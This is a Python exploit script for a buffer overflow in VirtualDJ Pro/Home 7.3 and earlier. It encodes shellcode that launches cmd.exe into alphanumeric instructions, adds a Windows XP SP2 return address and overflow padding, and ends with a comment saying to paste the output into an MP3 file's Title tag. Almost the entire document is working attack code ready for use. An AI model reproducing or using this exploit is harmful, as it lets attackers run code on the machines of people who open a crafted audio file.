#Exploit: VirtualDJ Pro/Home <=7.3 Buffer Overflow Vulnerability
#By: Alexandro Sáhez Bach | functionmixer.blogspot.com
#More info: http://www.youtube.com/watch?v=PJeaWqMJRm0
 
import string
 
 
def unicodeHex(c):
    c = hex(ord(c))[2:].upper()
    if len(c)==1:
        c = "0"+c
     
    return c+"00"
 
 
def movEAX(s):
    #Arrays
    s = map(ord, list(s))
    inst = []
    target = [512, 512, 512, 512]
    carry  = [0,-2,-2,-2]
    for i in range(4):
        if s[i] < 0x10:
            target[i] = 256
            if i < 3:
                carry[i+1] = -1
    diff = [target[b] - s[b] for b in range(4)]
 
    #Gen instructions
    for i in range(3):
        target = [target[b] - diff[b]/4 for b in range(4)]
        inst += [[diff[b]/4 for b in range(4)]]
    target = [target[b] - s[b] + carry[b] for b in range(4)]
    inst += [target]
     
    #Remove character '\'
    for b in range(4):
        if ord("[")  in [inst[i][b] for i in range(4)] or \
           ord("\\") in [inst[i][b] for i in range(4)] or \
           ord("]")  in [inst[i][b] for i in range(4)]:
            for i in range(4):
                inst[i][b] = inst[i][b]+5*((-1)**(i))
     
    inst  = ["\x2D"+"".join(map(chr, i)) for i in inst]
    return "".join(inst)
 
 
#Shellcode: Run cmd.exe
shellcode  = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC"
shellcode += "\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45"
shellcode += "\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45"
shellcode += "\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45"
shellcode += "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3"
retAddress = "\xED\x1E\x94\x7C" # JMP ESP ntdll.dll WinXP SP2
shellcode += retAddress
 
while len(shellcode) % 4 != 0:
    shellcode += '\x90'
     
 
exploit = ""
for i in range(0,len(shellcode),4)[::-1]:
    exploit += "\x25\x40\x40\x40\x40\x25\x3F\x3F\x3F\x3F"  #EAX = 0
    exploit += movEAX(shellcode[i:i+4])  #EAX = shellcode[i:i+4]
    exploit += "\x50"  #PUSH EAX
exploit += '\x54' #PUSH ESP
exploit += '\xC3' #RET
 
 
c = 0
for i in exploit:
    if i in string.ascii_letters:
        c+=1
exploit +=  "A"*(4100-c)
exploit += "FSFD"
 
print exploit
#Paste the generated code in the tag 'Title' of the MP3 file.

